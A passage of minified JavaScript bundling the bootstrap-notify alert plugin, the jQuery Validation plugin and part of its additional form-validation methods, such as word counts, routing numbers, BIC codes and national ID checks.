i.$ele.data("data-hover") && "pause" == i.settings.mouse_over || "pause" != i.settings.mouse_over) && (t = (i.settings.delay - e) / i.settings.delay * 100, i.$ele.data("notify-delay", e), i.$ele.find('[data-notify="progressbar"] > div').attr("aria-valuenow", t).css("width", t + "%")), e <= -i.settings.timer && (clearInterval(n), i.close()) }, i.settings.timer)) }, close: function () { var e = this, t = parseInt(this.$ele.css(this.settings.placement.from)), n = !1; this.$ele.data("closing", "true").addClass(this.settings.animate.exit), e.reposition(t), a.isFunction(e.settings.onClose) && e.settings.onClose.call(this.$ele), this.$ele.one(this.animations.start, function (t) { n = !0 }).one(this.animations.end, function (t) { a(this).remove(), a.isFunction(e.settings.onClosed) && e.settings.onClosed.call(this) }), setTimeout(function () { n || (e.$ele.remove(), e.settings.onClosed && e.settings.onClosed(e.$ele)) }, 600) }, reposition: function (t) { var e = this, n = '[data-notify-position="' + this.settings.placement.from + "-" + this.settings.placement.align + '"]:not([data-closing="true"])', i = this.$ele.nextAll(n); 1 == this.settings.newest_on_top && (i = this.$ele.prevAll(n)), i.each(function () { a(this).css(e.settings.placement.from, t), t = parseInt(t) + parseInt(e.settings.spacing) + a(this).outerHeight() }) } }), a.notify = function (t, e) { return new n(0, t, e).notify }, a.notifyDefaults = function (t) { return i = a.extend(!0, {}, i, t) }, a.notifyClose = function (t) { void 0 === t || "all" == t ? a("[data-notify]").find('[data-notify="dismiss"]').trigger("click") : a('[data-notify-position="' + t + '"]').find('[data-notify="dismiss"]').trigger("click") } }), $.notifyDefaults({ template: '<div data-notify="container" class="alert alert-{0} m-alert" role="alert"><button type="button" aria-hidden="true" class="close" data-notify="dismiss"></button><span data-notify="icon"></span><span data-notify="title">{1}</span><span data-notify="message">{2}</span><div class="progress" data-notify="progressbar"><div class="progress-bar progress-bar-animated bg-{0}" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;"></div></div><a href="{3}" target="{4}" data-notify="url"></a></div>' }), function (t) { "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof module && module.exports ? module.exports = t(require("jquery")) : t(jQuery) }(function (c) { var n; c.extend(c.fn, { validate: function (t) { if (this.length) { var i = c.data(this[0], "validator"); return i ? i : (this.attr("novalidate", "novalidate"), i = new c.validator(t, this[0]), c.data(this[0], "validator", i), i.settings.onsubmit && (this.on("click.validate", ":submit", function (t) { i.submitButton = t.currentTarget, c(this).hasClass("cancel") && (i.cancelSubmit = !0), void 0 !== c(this).attr("formnovalidate") && (i.cancelSubmit = !0) }), this.on("submit.validate", function (n) { function t() { var t, e; return i.submitButton && (i.settings.submitHandler || i.formSubmitted) && (t = c("<input type='hidden'/>").attr("name", i.submitButton.name).val(c(i.submitButton).val()).appendTo(i.currentForm)), !(i.settings.submitHandler && !i.settings.debug) || (e = i.settings.submitHandler.call(i, i.currentForm, n), t && t.remove(), void 0 !== e && e) } return i.settings.debug && n.preventDefault(), i.cancelSubmit ? (i.cancelSubmit = !1, t()) : i.form() ? i.pendingRequest ? !(i.formSubmitted = !0) : t() : (i.focusInvalid(), !1) })), i) } t && t.debug && window.console && console.warn("Nothing selected, can't validate, returning nothing.") }, valid: function () { var t, e, n; return c(this[0]).is("form") ? t = this.validate().form() : (n = [], t = !0, e = c(this[0].form).validate(), this.each(function () { (t = e.element(this) && t) || (n = n.concat(e.errorList)) }), e.errorList = n), t }, rules: function (t, e) { var n, i, o, a, s, r, g = this[0], l = void 0 !== this.attr("contenteditable") && "false" !== this.attr("contenteditable"); if (null != g && (!g.form && l && (g.form = this.closest("form")[0], g.name = this.attr("name")), null != g.form)) { if (t) switch (i = (n = c.data(g.form, "validator").settings).rules, o = c.validator.staticRules(g), t) { case "add": c.extend(o, c.validator.normalizeRule(e)), delete o.messages, i[g.name] = o, e.messages && (n.messages[g.name] = c.extend(n.messages[g.name], e.messages)); break; case "remove": return e ? (r = {}, c.each(e.split(/\s/), function (t, e) { r[e] = o[e], delete o[e] }), r) : (delete i[g.name], o) }return (a = c.validator.normalizeRules(c.extend({}, c.validator.classRules(g), c.validator.attributeRules(g), c.validator.dataRules(g), c.validator.staticRules(g)), g)).required && (s = a.required, delete a.required, a = c.extend({ required: s }, a)), a.remote && (s = a.remote, delete a.remote, a = c.extend(a, { remote: s })), a } } }), c.extend(c.expr.pseudos || c.expr[":"], { blank: function (t) { return !c.trim("" + c(t).val()) }, filled: function (t) { var e = c(t).val(); return null !== e && !!c.trim("" + e) }, unchecked: function (t) { return !c(t).prop("checked") } }), c.validator = function (t, e) { this.settings = c.extend(!0, {}, c.validator.defaults, t), this.currentForm = e, this.init() }, c.validator.format = function (n, t) { return 1 === arguments.length ? function () { var t = c.makeArray(arguments); return t.unshift(n), c.validator.format.apply(this, t) } : (void 0 === t || (2 < arguments.length && t.constructor !== Array && (t = c.makeArray(arguments).slice(1)), t.constructor !== Array && (t = [t]), c.each(t, function (t, e) { n = n.replace(new RegExp("\\{" + t + "\\}", "g"), function () { return e }) })), n) }, c.extend(c.validator, { defaults: { messages: {}, groups: {}, rules: {}, errorClass: "error", pendingClass: "pending", validClass: "valid", errorElement: "label", focusCleanup: !1, focusInvalid: !0, errorContainer: c([]), errorLabelContainer: c([]), onsubmit: !0, ignore: ":hidden", ignoreTitle: !1, onfocusin: function (t) { this.lastActive = t, this.settings.focusCleanup && (this.settings.unhighlight && this.settings.unhighlight.call(this, t, this.settings.errorClass, this.settings.validClass), this.hideThese(this.errorsFor(t))) }, onfocusout: function (t) { this.checkable(t) || !(t.name in this.submitted) && this.optional(t) || this.element(t) }, onkeyup: function (t, e) { 9 === e.which && "" === this.elementValue(t) || -1 !== c.inArray(e.keyCode, [16, 17, 18, 20, 35, 36, 37, 38, 39, 40, 45, 144, 225]) || (t.name in this.submitted || t.name in this.invalid) && this.element(t) }, onclick: function (t) { t.name in this.submitted ? this.element(t) : t.parentNode.name in this.submitted && this.element(t.parentNode) }, highlight: function (t, e, n) { "radio" === t.type ? this.findByName(t.name).addClass(e).removeClass(n) : c(t).addClass(e).removeClass(n) }, unhighlight: function (t, e, n) { "radio" === t.type ? this.findByName(t.name).removeClass(e).addClass(n) : c(t).removeClass(e).addClass(n) } }, setDefaults: function (t) { c.extend(c.validator.defaults, t) }, messages: { required: "This field is required.", remote: "Please fix this field.", email: "Please enter a valid email address.", url: "Please enter a valid URL.", date: "Please enter a valid date.", dateISO: "Please enter a valid date (ISO).", number: "Please enter a valid number.", digits: "Please enter only digits.", equalTo: "Please enter the same value again.", maxlength: c.validator.format("Please enter no more than {0} characters."), minlength: c.validator.format("Please enter at least {0} characters."), rangelength: c.validator.format("Please enter a value between {0} and {1} characters long."), range: c.validator.format("Please enter a value between {0} and {1}."), max: c.validator.format("Please enter a value less than or equal to {0}."), min: c.validator.format("Please enter a value greater than or equal to {0}."), step: c.validator.format("Please enter a multiple of {0}.") }, autoCreateRanges: !1, prototype: { init: function () { this.labelContainer = c(this.settings.errorLabelContainer), this.errorContext = this.labelContainer.length && this.labelContainer || c(this.currentForm), this.containers = c(this.settings.errorContainer).add(this.settings.errorLabelContainer), this.submitted = {}, this.valueCache = {}, this.pendingRequest = 0, this.pending = {}, this.invalid = {}, this.reset(); var n, a = this.currentForm, i = this.groups = {}; function t(t) { var e, n, i, o = void 0 !== c(this).attr("contenteditable") && "false" !== c(this).attr("contenteditable"); !this.form && o && (this.form = c(this).closest("form")[0], this.name = c(this).attr("name")), a === this.form && (e = c.data(this.form, "validator"), n = "on" + t.type.replace(/^validate/, ""), (i = e.settings)[n] && !c(this).is(i.ignore) && i[n].call(e, this, t)) } c.each(this.settings.groups, function (n, t) { "string" == typeof t && (t = t.split(/\s/)), c.each(t, function (t, e) { i[e] = n }) }), n = this.settings.rules, c.each(n, function (t, e) { n[t] = c.validator.normalizeRule(e) }), c(this.currentForm).on("focusin.validate focusout.validate keyup.validate", ":text, [type='password'], [type='file'], select, textarea, [type='number'], [type='search'], [type='tel'], [type='url'], [type='email'], [type='datetime'], [type='date'], [type='month'], [type='week'], [type='time'], [type='datetime-local'], [type='range'], [type='color'], [type='radio'], [type='checkbox'], [contenteditable], [type='button']", t).on("click.validate", "select, option, [type='radio'], [type='checkbox']", t), this.settings.invalidHandler && c(this.currentForm).on("invalid-form.validate", this.settings.invalidHandler) }, form: function () { return this.checkForm(), c.extend(this.submitted, this.errorMap), this.invalid = c.extend({}, this.errorMap), this.valid() || c(this.currentForm).triggerHandler("invalid-form", [this]), this.showErrors(), this.valid() }, checkForm: function () { this.prepareForm(); for (var t = 0, e = this.currentElements = this.elements(); e[t]; t++)this.check(e[t]); return this.valid() }, element: function (t) { var e, n, i = this.clean(t), o = this.validationTargetFor(i), a = this, s = !0; return void 0 === o ? delete this.invalid[i.name] : (this.prepareElement(o), this.currentElements = c(o), (n = this.groups[o.name]) && c.each(this.groups, function (t, e) { e === n && t !== o.name && (i = a.validationTargetFor(a.clean(a.findByName(t)))) && i.name in a.invalid && (a.currentElements.push(i), s = a.check(i) && s) }), e = !1 !== this.check(o), s = s && e, this.invalid[o.name] = !e, this.numberOfInvalids() || (this.toHide = this.toHide.add(this.containers)), this.showErrors(), c(t).attr("aria-invalid", !e)), s }, showErrors: function (e) { var n; e && (n = this, c.extend(this.errorMap, e), this.errorList = c.map(this.errorMap, function (t, e) { return { message: t, element: n.findByName(e)[0] } }), this.successList = c.grep(this.successList, function (t) { return !(t.name in e) })), this.settings.showErrors ? this.settings.showErrors.call(this, this.errorMap, this.errorList) : this.defaultShowErrors() }, resetForm: function () { c.fn.resetForm && c(this.currentForm).resetForm(), this.invalid = {}, this.submitted = {}, this.prepareForm(), this.hideErrors(); var t = this.elements().removeData("previousValue").removeAttr("aria-invalid"); this.resetElements(t) }, resetElements: function (t) { var e; if (this.settings.unhighlight) for (e = 0; t[e]; e++)this.settings.unhighlight.call(this, t[e], this.settings.errorClass, ""), this.findByName(t[e].name).removeClass(this.settings.validClass); else t.removeClass(this.settings.errorClass).removeClass(this.settings.validClass) }, numberOfInvalids: function () { return this.objectLength(this.invalid) }, objectLength: function (t) { var e, n = 0; for (e in t) void 0 !== t[e] && null !== t[e] && !1 !== t[e] && n++; return n }, hideErrors: function () { this.hideThese(this.toHide) }, hideThese: function (t) { t.not(this.containers).text(""), this.addWrapper(t).hide() }, valid: function () { return 0 === this.size() }, size: function () { return this.errorList.length }, focusInvalid: function () { if (this.settings.focusInvalid) try { c(this.findLastActive() || this.errorList.length && this.errorList[0].element || []).filter(":visible").focus().trigger("focusin") } catch (t) { } }, findLastActive: function () { var e = this.lastActive; return e && 1 === c.grep(this.errorList, function (t) { return t.element.name === e.name }).length && e }, elements: function () { var n = this, i = {}; return c(this.currentForm).find("input, select, textarea, [contenteditable]").not(":submit, :reset, :image, :disabled").not(this.settings.ignore).filter(function () { var t = this.name || c(this).attr("name"), e = void 0 !== c(this).attr("contenteditable") && "false" !== c(this).attr("contenteditable"); return !t && n.settings.debug && window.console && console.error("%o has no name assigned", this), e && (this.form = c(this).closest("form")[0], this.name = t), this.form === n.currentForm && (!(t in i || !n.objectLength(c(this).rules())) && (i[t] = !0)) }) }, clean: function (t) { return c(t)[0] }, errors: function () { var t = this.settings.errorClass.split(" ").join("."); return c(this.settings.errorElement + "." + t, this.errorContext) }, resetInternals: function () { this.successList = [], this.errorList = [], this.errorMap = {}, this.toShow = c([]), this.toHide = c([]) }, reset: function () { this.resetInternals(), this.currentElements = c([]) }, prepareForm: function () { this.reset(), this.toHide = this.errors().add(this.containers) }, prepareElement: function (t) { this.reset(), this.toHide = this.errorsFor(t) }, elementValue: function (t) { var e, n, i = c(t), o = t.type, a = void 0 !== i.attr("contenteditable") && "false" !== i.attr("contenteditable"); return "radio" === o || "checkbox" === o ? this.findByName(t.name).filter(":checked").val() : "number" === o && void 0 !== t.validity ? t.validity.badInput ? "NaN" : i.val() : (e = a ? i.text() : i.val(), "file" === o ? "C:\\fakepath\\" === e.substr(0, 12) ? e.substr(12) : 0 <= (n = e.lastIndexOf("/")) || 0 <= (n = e.lastIndexOf("\\")) ? e.substr(n + 1) : e : "string" == typeof e ? e.replace(/\r/g, "") : e) }, check: function (e) { e = this.validationTargetFor(this.clean(e)); var t, n, i, o, a = c(e).rules(), s = c.map(a, function (t, e) { return e }).length, r = !1, g = this.elementValue(e); for (n in "function" == typeof a.normalizer ? o = a.normalizer : "function" == typeof this.settings.normalizer && (o = this.settings.normalizer), o && (g = o.call(e, g), delete a.normalizer), a) { i = { method: n, parameters: a[n] }; try { if ("dependency-mismatch" === (t = c.validator.methods[n].call(this, g, e, i.parameters)) && 1 === s) { r = !0; continue } if (r = !1, "pending" === t) return void (this.toHide = this.toHide.not(this.errorsFor(e))); if (!t) return this.formatAndAdd(e, i), !1 } catch (t) { throw this.settings.debug && window.console && console.log("Exception occurred when checking element " + e.id + ", check the '" + i.method + "' method.", t), t instanceof TypeError && (t.message += ".  Exception occurred when checking element " + e.id + ", check the '" + i.method + "' method."), t } } if (!r) return this.objectLength(a) && this.successList.push(e), !0 }, customDataMessage: function (t, e) { return c(t).data("msg" + e.charAt(0).toUpperCase() + e.substring(1).toLowerCase()) || c(t).data("msg") }, customMessage: function (t, e) { var n = this.settings.messages[t]; return n && (n.constructor === String ? n : n[e]) }, findDefined: function () { for (var t = 0; t < arguments.length; t++)if (void 0 !== arguments[t]) return arguments[t] }, defaultMessage: function (t, e) { "string" == typeof e && (e = { method: e }); var n = this.findDefined(this.customMessage(t.name, e.method), this.customDataMessage(t, e.method), !this.settings.ignoreTitle && t.title || void 0, c.validator.messages[e.method], "<strong>Warning: No message defined for " + t.name + "</strong>"), i = /\$?\{(\d+)\}/g; return "function" == typeof n ? n = n.call(this, e.parameters, t) : i.test(n) && (n = c.validator.format(n.replace(i, "{$1}"), e.parameters)), n }, formatAndAdd: function (t, e) { var n = this.defaultMessage(t, e); this.errorList.push({ message: n, element: t, method: e.method }), this.errorMap[t.name] = n, this.submitted[t.name] = n }, addWrapper: function (t) { return this.settings.wrapper && (t = t.add(t.parent(this.settings.wrapper))), t }, defaultShowErrors: function () { for (var t, e, n = 0; this.errorList[n]; n++)e = this.errorList[n], this.settings.highlight && this.settings.highlight.call(this, e.element, this.settings.errorClass, this.settings.validClass), this.showLabel(e.element, e.message); if (this.errorList.length && (this.toShow = this.toShow.add(this.containers)), this.settings.success) for (n = 0; this.successList[n]; n++)this.showLabel(this.successList[n]); if (this.settings.unhighlight) for (n = 0, t = this.validElements(); t[n]; n++)this.settings.unhighlight.call(this, t[n], this.settings.errorClass, this.settings.validClass); this.toHide = this.toHide.not(this.toShow), this.hideErrors(), this.addWrapper(this.toShow).show() }, validElements: function () { return this.currentElements.not(this.invalidElements()) }, invalidElements: function () { return c(this.errorList).map(function () { return this.element }) }, showLabel: function (t, e) { var n, i, o, a, s = this.errorsFor(t), r = this.idOrName(t), g = c(t).attr("aria-describedby"); s.length ? (s.removeClass(this.settings.validClass).addClass(this.settings.errorClass), s.html(e)) : (n = s = c("<" + this.settings.errorElement + ">").attr("id", r + "-error").addClass(this.settings.errorClass).html(e || ""), this.settings.wrapper && (n = s.hide().show().wrap("<" + this.settings.wrapper + "/>").parent()), this.labelContainer.length ? this.labelContainer.append(n) : this.settings.errorPlacement ? this.settings.errorPlacement.call(this, n, c(t)) : n.insertAfter(t), s.is("label") ? s.attr("for", r) : 0 === s.parents("label[for='" + this.escapeCssMeta(r) + "']").length && (o = s.attr("id"), g ? g.match(new RegExp("\\b" + this.escapeCssMeta(o) + "\\b")) || (g += " " + o) : g = o, c(t).attr("aria-describedby", g), (i = this.groups[t.name]) && (a = this, c.each(a.groups, function (t, e) { e === i && c("[name='" + a.escapeCssMeta(t) + "']", a.currentForm).attr("aria-describedby", s.attr("id")) })))), !e && this.settings.success && (s.text(""), "string" == typeof this.settings.success ? s.addClass(this.settings.success) : this.settings.success(s, t)), this.toShow = this.toShow.add(s) }, errorsFor: function (t) { var e = this.escapeCssMeta(this.idOrName(t)), n = c(t).attr("aria-describedby"), i = "label[for='" + e + "'], label[for='" + e + "'] *"; return n && (i = i + ", #" + this.escapeCssMeta(n).replace(/\s+/g, ", #")), this.errors().filter(i) }, escapeCssMeta: function (t) { return t.replace(/([\\!"#$%&'()*+,./:;<=>?@\[\]^`{|}~])/g, "\\$1") }, idOrName: function (t) { return this.groups[t.name] || !this.checkable(t) && t.id || t.name }, validationTargetFor: function (t) { return this.checkable(t) && (t = this.findByName(t.name)), c(t).not(this.settings.ignore)[0] }, checkable: function (t) { return /radio|checkbox/i.test(t.type) }, findByName: function (t) { return c(this.currentForm).find("[name='" + this.escapeCssMeta(t) + "']") }, getLength: function (t, e) { switch (e.nodeName.toLowerCase()) { case "select": return c("option:selected", e).length; case "input": if (this.checkable(e)) return this.findByName(e.name).filter(":checked").length }return t.length }, depend: function (t, e) { return !this.dependTypes[typeof t] || this.dependTypes[typeof t](t, e) }, dependTypes: { boolean: function (t) { return t }, string: function (t, e) { return !!c(t, e.form).length }, function: function (t, e) { return t(e) } }, optional: function (t) { var e = this.elementValue(t); return !c.validator.methods.required.call(this, e, t) && "dependency-mismatch" }, startRequest: function (t) { this.pending[t.name] || (this.pendingRequest++, c(t).addClass(this.settings.pendingClass), this.pending[t.name] = !0) }, stopRequest: function (t, e) { this.pendingRequest--, this.pendingRequest < 0 && (this.pendingRequest = 0), delete this.pending[t.name], c(t).removeClass(this.settings.pendingClass), e && 0 === this.pendingRequest && this.formSubmitted && this.form() ? (c(this.currentForm).submit(), this.submitButton && c("input:hidden[name='" + this.submitButton.name + "']", this.currentForm).remove(), this.formSubmitted = !1) : !e && 0 === this.pendingRequest && this.formSubmitted && (c(this.currentForm).triggerHandler("invalid-form", [this]), this.formSubmitted = !1) }, previousValue: function (t, e) { return e = "string" == typeof e && e || "remote", c.data(t, "previousValue") || c.data(t, "previousValue", { old: null, valid: !0, message: this.defaultMessage(t, { method: e }) }) }, destroy: function () { this.resetForm(), c(this.currentForm).off(".validate").removeData("validator").find(".validate-equalTo-blur").off(".validate-equalTo").removeClass("validate-equalTo-blur").find(".validate-lessThan-blur").off(".validate-lessThan").removeClass("validate-lessThan-blur").find(".validate-lessThanEqual-blur").off(".validate-lessThanEqual").removeClass("validate-lessThanEqual-blur").find(".validate-greaterThanEqual-blur").off(".validate-greaterThanEqual").removeClass("validate-greaterThanEqual-blur").find(".validate-greaterThan-blur").off(".validate-greaterThan").removeClass("validate-greaterThan-blur") } }, classRuleSettings: { required: { required: !0 }, email: { email: !0 }, url: { url: !0 }, date: { date: !0 }, dateISO: { dateISO: !0 }, number: { number: !0 }, digits: { digits: !0 }, creditcard: { creditcard: !0 } }, addClassRules: function (t, e) { t.constructor === String ? this.classRuleSettings[t] = e : c.extend(this.classRuleSettings, t) }, classRules: function (t) { var e = {}, n = c(t).attr("class"); return n && c.each(n.split(" "), function () { this in c.validator.classRuleSettings && c.extend(e, c.validator.classRuleSettings[this]) }), e }, normalizeAttributeRule: function (t, e, n, i) { /min|max|step/.test(n) && (null === e || /number|range|text/.test(e)) && (i = Number(i), isNaN(i) && (i = void 0)), i || 0 === i ? t[n] = i : e === n && "range" !== e && (t[n] = !0) }, attributeRules: function (t) { var e, n, i = {}, o = c(t), a = t.getAttribute("type"); for (e in c.validator.methods) n = "required" === e ? ("" === (n = t.getAttribute(e)) && (n = !0), !!n) : o.attr(e), this.normalizeAttributeRule(i, a, e, n); return i.maxlength && /-1|2147483647|524288/.test(i.maxlength) && delete i.maxlength, i }, dataRules: function (t) { var e, n, i = {}, o = c(t), a = t.getAttribute("type"); for (e in c.validator.methods) "" === (n = o.data("rule" + e.charAt(0).toUpperCase() + e.substring(1).toLowerCase())) && (n = !0), this.normalizeAttributeRule(i, a, e, n); return i }, staticRules: function (t) { var e = {}, n = c.data(t.form, "validator"); return n.settings.rules && (e = c.validator.normalizeRule(n.settings.rules[t.name]) || {}), e }, normalizeRules: function (i, o) { return c.each(i, function (t, e) { if (!1 !== e) { if (e.param || e.depends) { var n = !0; switch (typeof e.depends) { case "string": n = !!c(e.depends, o.form).length; break; case "function": n = e.depends.call(o, o) }n ? i[t] = void 0 === e.param || e.param : (c.data(o.form, "validator").resetElements(c(o)), delete i[t]) } } else delete i[t] }), c.each(i, function (t, e) { i[t] = c.isFunction(e) && "normalizer" !== t ? e(o) : e }), c.each(["minlength", "maxlength"], function () { i[this] && (i[this] = Number(i[this])) }), c.each(["rangelength", "range"], function () { var t; i[this] && (c.isArray(i[this]) ? i[this] = [Number(i[this][0]), Number(i[this][1])] : "string" == typeof i[this] && (t = i[this].replace(/[\[\]]/g, "").split(/[\s,]+/), i[this] = [Number(t[0]), Number(t[1])])) }), c.validator.autoCreateRanges && (null != i.min && null != i.max && (i.range = [i.min, i.max], delete i.min, delete i.max), null != i.minlength && null != i.maxlength && (i.rangelength = [i.minlength, i.maxlength], delete i.minlength, delete i.maxlength)), i }, normalizeRule: function (t) { var e; return "string" == typeof t && (e = {}, c.each(t.split(/\s/), function () { e[this] = !0 }), t = e), t }, addMethod: function (t, e, n) { c.validator.methods[t] = e, c.validator.messages[t] = void 0 !== n ? n : c.validator.messages[t], e.length < 3 && c.validator.addClassRules(t, c.validator.normalizeRule(t)) }, methods: { required: function (t, e, n) { if (!this.depend(n, e)) return "dependency-mismatch"; if ("select" !== e.nodeName.toLowerCase()) return this.checkable(e) ? 0 < this.getLength(t, e) : null != t && 0 < t.length; var i = c(e).val(); return i && 0 < i.length }, email: function (t, e) { return this.optional(e) || /^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(t) }, url: function (t, e) { return this.optional(e) || /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(t) }, date: (n = !1, function (t, e) { return n || (n = !0, this.settings.debug && window.console && console.warn("The `date` method is deprecated and will be removed in version '2.0.0'.\nPlease don't use it, since it relies on the Date constructor, which\nbehaves very differently across browsers and locales. Use `dateISO`\ninstead or one of the locale specific methods in `localizations/`\nand `additional-methods.js`.")), this.optional(e) || !/Invalid|NaN/.test(new Date(t).toString()) }), dateISO: function (t, e) { return this.optional(e) || /^\d{4}[\/\-](0?[1-9]|1[012])[\/\-](0?[1-9]|[12][0-9]|3[01])$/.test(t) }, number: function (t, e) { return this.optional(e) || /^(?:-?\d+|-?\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test(t) }, digits: function (t, e) { return this.optional(e) || /^\d+$/.test(t) }, minlength: function (t, e, n) { var i = c.isArray(t) ? t.length : this.getLength(t, e); return this.optional(e) || n <= i }, maxlength: function (t, e, n) { var i = c.isArray(t) ? t.length : this.getLength(t, e); return this.optional(e) || i <= n }, rangelength: function (t, e, n) { var i = c.isArray(t) ? t.length : this.getLength(t, e); return this.optional(e) || i >= n[0] && i <= n[1] }, min: function (t, e, n) { return this.optional(e) || n <= t }, max: function (t, e, n) { return this.optional(e) || t <= n }, range: function (t, e, n) { return this.optional(e) || t >= n[0] && t <= n[1] }, step: function (t, e, n) { function i(t) { var e = ("" + t).match(/(?:\.(\d+))?$/); return e && e[1] ? e[1].length : 0 } function o(t) { return Math.round(t * Math.pow(10, a)) } var a, s = c(e).attr("type"), r = "Step attribute on input type " + s + " is not supported.", g = new RegExp("\\b" + s + "\\b"), l = !0; if (s && !g.test(["text", "number", "range"].join())) throw new Error(r); return a = i(n), (i(t) > a || o(t) % o(n) != 0) && (l = !1), this.optional(e) || l }, equalTo: function (t, e, n) { var i = c(n); return this.settings.onfocusout && i.not(".validate-equalTo-blur").length && i.addClass("validate-equalTo-blur").on("blur.validate-equalTo", function () { c(e).valid() }), t === i.val() }, remote: function (a, s, t, r) { if (this.optional(s)) return "dependency-mismatch"; r = "string" == typeof r && r || "remote"; var g, e, n, l = this.previousValue(s, r); return this.settings.messages[s.name] || (this.settings.messages[s.name] = {}), l.originalMessage = l.originalMessage || this.settings.messages[s.name][r], this.settings.messages[s.name][r] = l.message, t = "string" == typeof t ? { url: t } : t, n = c.param(c.extend({ data: a }, t.data)), l.old === n ? l.valid : (l.old = n, (g = this).startRequest(s), (e = {})[s.name] = a, c.ajax(c.extend(!0, { mode: "abort", port: "validate" + s.name, dataType: "json", data: e, context: g.currentForm, success: function (t) { var e, n, i, o = !0 === t || "true" === t; g.settings.messages[s.name][r] = l.originalMessage, o ? (i = g.formSubmitted, g.resetInternals(), g.toHide = g.errorsFor(s), g.formSubmitted = i, g.successList.push(s), g.invalid[s.name] = !1, g.showErrors()) : (e = {}, n = t || g.defaultMessage(s, { method: r, parameters: a }), e[s.name] = l.message = n, g.invalid[s.name] = !0, g.showErrors(e)), l.valid = o, g.stopRequest(s, o) } }, t)), "pending") } } }); var i, o = {}; return c.ajaxPrefilter ? c.ajaxPrefilter(function (t, e, n) { var i = t.port; "abort" === t.mode && (o[i] && o[i].abort(), o[i] = n) }) : (i = c.ajax, c.ajax = function (t) { var e = ("mode" in t ? t : c.ajaxSettings).mode, n = ("port" in t ? t : c.ajaxSettings).port; return "abort" === e ? (o[n] && o[n].abort(), o[n] = i.apply(this, arguments), o[n]) : i.apply(this, arguments) }), c }), function (t) { "function" == typeof define && define.amd ? define(["jquery", "./jquery.validate"], t) : "object" == typeof module && module.exports ? module.exports = t(require("jquery")) : t(jQuery) }(function (g) { function a(t) { return t.replace(/<.[^<>]*?>/g, " ").replace(/&nbsp;|&#160;/gi, " ").replace(/[.(),;:!?%#$'\"_+=\/\-âââ]*/g, "") } return g.validator.addMethod("maxWords", function (t, e, n) { return this.optional(e) || a(t).match(/\b\w+\b/g).length <= n }, g.validator.format("Please enter {0} words or less.")), g.validator.addMethod("minWords", function (t, e, n) { return this.optional(e) || a(t).match(/\b\w+\b/g).length >= n }, g.validator.format("Please enter at least {0} words.")), g.validator.addMethod("rangeWords", function (t, e, n) { var i = a(t), o = /\b\w+\b/g; return this.optional(e) || i.match(o).length >= n[0] && i.match(o).length <= n[1] }, g.validator.format("Please enter between {0} and {1} words.")), g.validator.addMethod("abaRoutingNumber", function (t) { var e = 0, n = t.split(""), i = n.length; if (9 !== i) return !1; for (var o = 0; o < i; o += 3)e += 3 * parseInt(n[o], 10) + 7 * parseInt(n[o + 1], 10) + parseInt(n[o + 2], 10); return 0 !== e && e % 10 == 0 }, "Please enter a valid routing number."), g.validator.addMethod("accept", function (t, e, n) { var i, o, a = "string" == typeof n ? n.replace(/\s/g, "") : "image/*", s = this.optional(e); if (s) return s; if ("file" === g(e).attr("type") && (a = a.replace(/[\-\[\]\/\{\}\(\)\+\?\.\\\^\$\|]/g, "\\$&").replace(/,/g, "|").replace(/\/\*/g, "/.*"), e.files && e.files.length)) for (o = new RegExp(".?(" + a + ")$", "i"), i = 0; i < e.files.length; i++)if (!e.files[i].type.match(o)) return !1; return !0 }, g.validator.format("Please enter a value with a valid mimetype.")), g.validator.addMethod("alphanumeric", function (t, e) { return this.optional(e) || /^\w+$/i.test(t) }, "Letters, numbers, and underscores only please"), g.validator.addMethod("bankaccountNL", function (t, e) { if (this.optional(e)) return !0; if (!/^[0-9]{9}|([0-9]{2} ){3}[0-9]{3}$/.test(t)) return !1; for (var n = t.replace(/ /g, ""), i = 0, o = n.length, a = 0; a < o; a++)i += (o - a) * n.substring(a, a + 1); return i % 11 == 0 }, "Please specify a valid bank account number"), g.validator.addMethod("bankorgiroaccountNL", function (t, e) { return this.optional(e) || g.validator.methods.bankaccountNL.call(this, t, e) || g.validator.methods.giroaccountNL.call(this, t, e) }, "Please specify a valid bank or giro account number"), g.validator.addMethod("bic", function (t, e) { return this.optional(e) || /^([A-Z]{6}[A-Z2-9][A-NP-Z1-9])(X{3}|[A-WY-Z0-9][A-Z0-9]{2})?$/.test(t.toUpperCase()) }, "Please specify a valid BIC code"), g.validator.addMethod("cifES", function (t, e) { "use strict"; if (this.optional(e)) return !0; var n, i, o, a, s = new RegExp(/^([ABCDEFGHJKLMNPQRSUVW])(\d{7})([0-9A-J])$/gi), r = t.substring(0, 1), g = t.substring(1, 8), l = t.substring(8, 9), c = 0, I = 0; if (9 !== t.length || !s.test(t)) return !1; for (n = 0; n < g.length; n++)i = parseInt(g[n], 10), n % 2 == 0 ? I += (i *= 2) < 10 ? i : i - 9 : c += i; return o = (10 - (c + I).toString().substr(-1)).toString(), o = 9 < parseInt(o, 10) ? "0" : o, a = "JABCDEFGHI".substr(o, 1).toString(), r.match(/[ABEH]/) ? l === o : !r.match(/[KPQS]/) && l === o || l === a }, "Please specify a valid CIF number."), g.validator.addMethod("cnhBR", function (t) { if (11 !== (t = t.replace(/([~!@#$%^&*()_+=`{}\[\]\-|\\:;'<>,.\/? ])+/g, "")).length) return !1; var e, n, i, o, a = 0, s = 0, r = t.charAt(0); if (new Array(12).join(r) === t) return !1; for (o = 9, i = 0; i < 9; ++i, --o)a += +t.charAt(i) * o; for (10 <= (e = a % 11) && 